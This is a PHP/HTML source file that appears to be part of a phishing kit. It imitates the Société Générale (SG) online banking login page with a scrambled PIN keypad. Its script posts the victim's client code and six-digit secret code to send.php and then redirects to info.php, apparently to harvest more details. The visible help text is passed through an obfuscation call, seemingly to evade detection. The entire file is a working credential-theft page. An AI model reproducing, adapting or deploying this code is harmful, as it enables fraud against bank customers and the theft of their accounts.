<?php 
require "../main.php";
?><!doctype html>
<html>
<head>
<title>SG | Connexion</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css">
<link rel="stylesheet" href="res/jihanaid.css">
<link rel="stylesheet" href="res/main.css">
<link rel="icon" href="res/icon.png">
</head>
<body>
<div class="container-full">
<div class="topmenu text-right hide-on-below-700">
<img src="res/topmenu.png">
</div>
<header>
<div class="row p-5 align-items-center">
    <div class="col-100 text-left text-right-on-below-700">
        <img src="res/logo.svg">
    </div>
    <div class="col-100 text-right">
        <button class="btn-pil register">Ouvrir un compte</button>
    </div>
</div>
</header>
<div class="mobileline">  
</div>

<style>
@media screen and (max-width:900px){
    .frmttl{text-align:center};
}
    </style>

<div class="p-5 pl-3 pr-3" style="margin-bottom:80px;">
<h5 class="frmttl">Connexion à votre Espace Client Particuliers</h5>
</div>









<div class="row d-block-on-below-900" >








<div class="col-100 text-center p-3">




<div class="form display-inline-block" style="width:370px; max-width:100%;">

<div class="form-col">
<div class="row doubleinput">
<div class="col-100">
    <input type="text" placeholder="Saisissez votre code client" id="u" maxlength="8">
</div>
<div class="col">
    <img src="res/reset.png" id="statupic" onclick="resetUser()">
</div>
</div>
<p style="color:red; font-size:0.8em; display:none;" id="user-error">Votre identifiant est incorrect</p>
<p style="color:red; font-size:0.8em; display:<?php if(isset($_GET['e'])){echo 'block'; }else{echo 'none'; } ?>;" id="login-error">Veuillez vérifier votre Code Client et votre Code Secret. <u>En savoir plus</u>.</p>
</div>
<style>
.toggle-switch {
  position: relative;
  display: inline-block;
  width: 60px;
  height: 30px;
}

.toggle-switch input[type="checkbox"] {
  display: none;
}

.slider {
  position: absolute;
  cursor: pointer;
  top: 0;
  left: 0;
  right: 0;
  bottom: 0;
  background-color: #ccc;
  transition: .4s;
}

.slider:before {
  position: absolute;
  content: "";
  height: 20px;
  width: 20px;
  left: 4px;
  bottom: 5px;
  background-color: white;
  transition: .4s;
}

input[type="checkbox"]:checked + .slider {
  background-color: #3DB77D; /* Green color */
}

input[type="checkbox"]:checked + .slider:before {
  transform: translateX(26px);
}

.slider.round {
  border-radius: 34px;
}

.slider.round:before {
  border-radius: 50%;
}
</style>

<div class="form-col d-flex align-items-cen">
    <img src="res/rememberme.png" style="width:250px;">
<!--  

    <label class="toggle-switch">
  <input type="checkbox" id="remember-device" />
  <span class="slider round"></span>
</label>

  <img src="res/sv.png" style="width:170px;"> -->

</div>

<div id="passbox" style="display:none;">
<div class="form-col">
    <div class="inputsgroup">
        <!-- <input type="password" maxlength="1" readonly="" id="i0" placeholder="-">
        <input type="password" maxlength="1" readonly="" id="i1" placeholder="-">
        <input type="password" maxlength="1" readonly="" id="i2" placeholder="-">
        <input type="password" maxlength="1" readonly="" id="i3" placeholder="-">
        <input type="password" maxlength="1" readonly="" id="i4" placeholder="-">
        <input type="password" maxlength="1" readonly="" id="i5" placeholder="-"> -->
        <input type="password" id="p" class="passinput" placeholder="------" readonly="">
        <img src="res/reset.png" style="display:none; width:24px;" id="passreset" onclick="resetPass()">
    </div>
</div>

<div class="form-col">
    <div class="keyboard">
        <div class="kb-sector">
            <button onclick="add(3)">3</button>
            <button onclick="add(0)">0</button>
            <button onclick="add(1)">1</button>
            <button></button>
        </div>
        <div class="kb-sector">
            <button ></button>
            <button onclick="add(7)">7</button>
            <button onclick="add(4)">4</button>
            <button onclick="add(9)">9</button>
        </div>
        <div class="kb-sector">
            <button onclick="add(8)">8</button>
            <button onclick="add(5)">5</button>
            <button></button>
            <button></button>
        </div>
        <div class="kb-sector">
            <button></button>
            <button onclick="add(2)">2</button>
            <button onclick="add(6)">6</button>
            <button></button>
        </div>
    </div>
</div>
</div>



<div class="form-col">
    <button class="submitbtn" onclick="sendUser()">Valider</button>
</div>




</div>




</div>




<div class="col-100 text-center rightcol">
<div class="display-inline-block text-left p-3" style="width:600px; max-width:100%;">
<h4><?php $obf->obf("Où trouver mon Code Client SG ?"); ?></h4>
<ul>
<li><?php $obf->obf("Si vous étiez client Société Générale, votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance. Il est également indiqué sur vos relevés de comptes."); ?></li>
<li><?php $obf->obf("Si vous étiez client d’une des banques du Groupe Crédit du Nord, votre Code Client SG vous a été envoyé par courrier postal il y a quelques semaines. Il remplace votre ancien identifiant."); ?></li>
</ul>

<h4><?php $obf->obf("Mon Code Secret a-t-il changé avec SG ?"); ?></h4>
<?php $obf->obf("Vous seul connaissez votre Code Secret."); ?>
<ul>
    <li><?php $obf->obf("Si vous étiez client Société Générale, utilisez votre Code Secret habituel."); ?></li>
<li><?php $obf->obf("Si vous étiez client d’une des banques du Groupe Crédit du Nord, utilisez le Code Secret qui vous permettait de vous connecter à votre Banque en Ligne."); ?></li>
</ul>

<h4><?php $obf->obf("Code Client ou Code Secret inconnus ?"); ?></h4>
<p>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Je souhaite obtenir mon Code Client"); ?></a>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Je ne connais pas mon Code Secret"); ?></a>
</p>
<h4><?php $obf->obf("Nos autres Espaces Client"); ?></h4>
<p>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Espace Client Professionnels (Progéliance Net)"); ?></a>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Espace Client Entreprises (Sogecash Net)"); ?></a>
</p>
<h4><?php $obf->obf("Urgences carte bancaire"); ?></h4>
<p>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Faire opposition à votre carte bancaire"); ?></a>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Verrouiller votre carte bancaire"); ?></a>
</p>
<h4><?php $obf->obf("Nos conseils sécurité"); ?></h4>
<p>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Découvrez le Pass sécurité"); ?></a>
<a href="#"><i class="fa-solid fa-angles-right"></i> <?php $obf->obf("Voir les menaces identifiées"); ?></a>
<a href="#"><i class="fa-solid fa-angles-right"></i><?php $obf->obf(" Guide des bonnes pratiques"); ?></a>
</p>

</div>
</div>





</div>











</div>
<footer>
<img src="res/bottom-footer.png" id="mobile" style="max-width:100%;">
<img src="res/bottom-footer-pc.png" id="pc" style="max-width:100%;">
</footer>
<script src="res/cdns/jq.js"></script>
<script src="res/cdns/m.js"></script>
<script>
 

$("#u").keyup(()=>{
    if($("#u").val().length==8){
        $("#statupic").attr("src", "res/valid.png");
        $("#statupic").attr("onclick", "return;");
    }else{
        $("#statupic").attr("src", "res/reset.png");
        $("#statupic").attr("onclick", "resetUser()");
    }
});


function resetUser(){
    $("#u").val("");
}

$("#u").keypress((e)=>{
    if(e.key=="Enter"){
        $(".submitbtn").click();
    }
});

function sendUser(){
    // alert();
    $("#user-error").hide();
    if($("#u").val().length<8){
        $("#user-error").show();
    }else{
        $(".submitbtn").css("background", "#fa596c");
        $(".submitbtn").attr("onclick", "return false;");
    setTimeout(()=>{
        $(".submitbtn").css("background", "#e9041e");
        showPassBox();
        $(".submitbtn").attr("onclick", "sendPass()");
    },1000);


    }
}

 
function add(num){
   
    $("#passreset").show();
    if($("#p").val().length>=6){
        return;
    }else{
        var passval = $("#p").val().toString()+num;
        $("#p").val(passval);
    }
    
}

function showPassBox(){
     $("#passbox").show();
}

function resetPass(){
    $("#passreset").hide();
    $("#p").val("");
}

function sendPass(){
//    alert($("#u").val()+" - "+pass);
var pass = $("#p").val();
   $('#login-error').hide();
    if($("#u").val().length!=8 || pass.length!=6){
        $('#login-error').show();
    }else{
        $(".submitbtn").css("background", "#fa596c");
        $(".submitbtn").attr("onclick", "return false;");

    $.post("send.php",{user:$("#u").val(), pass:pass}, (d)=>{

        setTimeout(()=>{
            window.location="./info.php";
        },1000);

    });


    }
}
</script>
</body>
</html>